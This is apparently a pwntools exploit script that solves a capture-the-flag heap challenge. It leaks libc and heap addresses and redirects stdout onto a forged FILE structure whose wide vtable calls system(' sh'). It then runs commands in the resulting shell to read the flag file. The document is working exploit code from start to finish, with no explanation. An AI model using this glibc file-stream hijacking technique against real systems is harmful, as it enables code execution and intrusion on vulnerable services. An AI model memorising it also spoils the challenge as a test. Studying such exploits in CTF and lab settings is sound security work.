from pwn import *
import time, sys
context.log_level='info'
HOST = sys.argv[1] if len(sys.argv)>1 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv)>2 else 9000

def s4(n):
    s=str(n).encode()
    return s+b'\n'*(4-len(s)) if len(s)<4 else s[:4]
def U(b): return u64(b.ljust(8,b'\x00'))
def blk(sz, st):
    b=bytearray(sz)
    for off,val,ln in st:
        if ln==8: b[off:off+8]=p64(val)
        else: b[off:off+ln]=val.to_bytes(ln,'little')
    return bytes(b)

io = process(['setarch','-R','/tmp/libcx/chal']) if HOST=='local' else remote(HOST,PORT)
io.recvuntil(b'5.forge_notes\n')
def drain(t=0.25):
    time.sleep(t); d=b''
    while True:
        try: x=io.recv(timeout=0.2)
        except Exception: break
        if not x: break
        d+=x
    return d

# ---- libc leak (unsorted bin) ----
io.send(s4(1)+s4(0)+s4(0x500)+s4(1)+s4(1)+s4(0x20)+s4(2)+s4(0)+s4(1)+s4(2)+s4(0x500)+s4(4)+s4(2))
o=drain()
i=o.find(b'Nanja koriya!!!\n')
libc_base=U(o[i+16:].split(b'\n')[0])-0x21ace0
log.info("libc base = %#x" % libc_base)

SZ=0x400
IO_wfile_jumps=libc_base+0x2170c0
IO_file_jumps =libc_base+0x217600
LOCK         =libc_base+0x21ca70
SYSTEM       =libc_base+0x50d70
BUF          =libc_base+0x226000
CMD=b" sh\x00\x00\x00\x00\x00\x00"

benign = blk(SZ, [(0x00, 0, 8),
                  (0x20,BUF,8),(0x28,BUF,8),(0x30,BUF+0x800,8),
                  (0x38,BUF,8),(0x40,BUF+0x800,8),
                  (0x70,1,4),(0x80,1<<16,8),(0x88,LOCK,8),
                  (0xc0,0xffffffff,4),(0xa0,0,8),(0xd8,IO_file_jumps,8)])

# ---- heap leak: free a 0x400 tcache chunk and re-read its safe-linked fd ----
io.send(s4(1)+s4(3)+s4(SZ)); io.send(s4(3)+s4(3)+benign); io.send(s4(2)+s4(3))
io.send(s4(1)+s4(4)+s4(SZ))          # returns T
io.send(s4(4)+s4(4))                 # show(4) -> prints T>>12
io.recvuntil(b'Nanja koriya!!!\n')
hl=io.recvline().rstrip(b'\n')
log.info("heap raw = %s" % hl.hex())
T=(U(hl)<<12)|0x7e0
log.info("T = %#x" % T)
io.send(s4(2)+s4(4))                 # free T back into tcache

mal = blk(SZ, [(0x00,int.from_bytes(CMD,'little'),8),
               (0x70,1,4),(0x80,1<<16,8),(0x88,LOCK,8),(0xc0,0xffffffff,4),
               (0xa0,T+0x20,8),         # _wide_data
               (0xd8,IO_wfile_jumps,8),
               (0x100,T+0x100,8),       # wide->_wide_vtable (at wide+0xe0 = T+0x100)
               (0x168,SYSTEM,8)])       # __doallocate

# ---- hijack stdout -> T (tcache head) ----
io.send(s4(1)+s4(-6)+s4(SZ)); d=drain(0.2); log.info("hijack: %r" % d[-40:])
# ---- trigger ----
io.send(s4(3)+s4(-6)+mal); d=drain(0.4); log.info("trigger: %r" % d[-60:])
time.sleep(0.3)
io.send(b"id; cat /app/flag.txt; cat flag.txt; ls /\n")
time.sleep(1.0)
print("SHELL OUT:", drain(1.0))
io.close()
